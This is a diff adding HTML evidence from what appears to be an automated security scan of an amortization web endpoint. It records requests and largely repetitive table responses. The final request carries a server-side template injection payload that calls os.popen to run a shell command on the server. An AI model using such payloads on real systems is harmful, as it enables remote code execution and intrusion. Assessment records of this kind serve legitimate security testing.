+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;86&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;87&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;88&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;89&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;90&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;91&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;92&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;93&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;94&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;95&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;96&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;97&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;98&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;99&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;100&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32dfp8-47</code> — <code>artifacts/s-0005/ev-mr32dfp8-47/</code></div><div class="lbl">REQUEST</div><pre>GET /amortization?principal=10000&amp;term=13*17&amp;rate=5 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 34980
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:28:37 GMT
+expires: 0
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Amortization Table&lt;/title&gt;
+    &lt;i&gt;This feature is not yet fully implented.&lt;/i&gt;
+    &lt;style&gt;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 8px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;Amortization Table&lt;/h2&gt;
+    &lt;table id=&quot;paymentTable&quot;&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th&gt;Payment Number&lt;/th&gt;
+                &lt;th&gt;Principal&lt;/th&gt;
+                &lt;th&gt;Interest&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;1&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;2&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;3&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;4&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;5&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;6&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;7&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;8&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;9&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;10&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;11&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;12&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;13&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;14&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;15&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;16&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;17&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;18&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;19&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;20&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;21&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;22&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;23&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;24&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;25&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;26&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;27&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;28&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;29&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;30&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;31&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;32&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;33&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;34&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;35&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;36&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;37&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;38&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;39&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;40&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;41&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;42&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;43&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;44&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;45&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;46&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;47&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;48&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;49&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;50&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;51&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;52&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;53&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;54&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;55&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;56&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;57&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;58&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;59&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;60&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;61&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;62&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;63&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;64&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;65&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;66&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;67&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;68&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;69&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;70&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;71&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;72&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;73&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;74&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;75&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;76&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;77&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;78&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;79&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;80&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;81&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;82&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;83&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;84&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;85&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;86&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;87&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;88&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;89&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;90&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;91&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;92&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;93&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;94&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;95&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;96&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;97&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;98&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;99&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;100&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32ppi9-5h</code> — <code>artifacts/s-0005/ev-mr32ppi9-5h/</code></div><div class="lbl">REQUEST</div><pre>GET /amortization?principal=10000&amp;term=7&amp;rate=0.05 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1904
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:38:09 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Amortization Table&lt;/title&gt;
+    &lt;i&gt;This feature is not yet fully implented.&lt;/i&gt;
+    &lt;style&gt;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 8px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;Amortization Table&lt;/h2&gt;
+    &lt;table id=&quot;paymentTable&quot;&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th&gt;Payment Number&lt;/th&gt;
+                &lt;th&gt;Principal&lt;/th&gt;
+                &lt;th&gt;Interest&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;1&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;2&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;3&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;4&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;5&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;6&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;7&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+        &lt;/tbody&gt;
+    &lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32pprr-5i</code> — <code>artifacts/s-0005/ev-mr32pprr-5i/</code></div><div class="lbl">REQUEST</div><pre>GET /amortization?principal=10000&amp;term=lipsum.__globals__.os.popen(%27echo%20AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27).read().__len__()&amp;rate=0.05 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
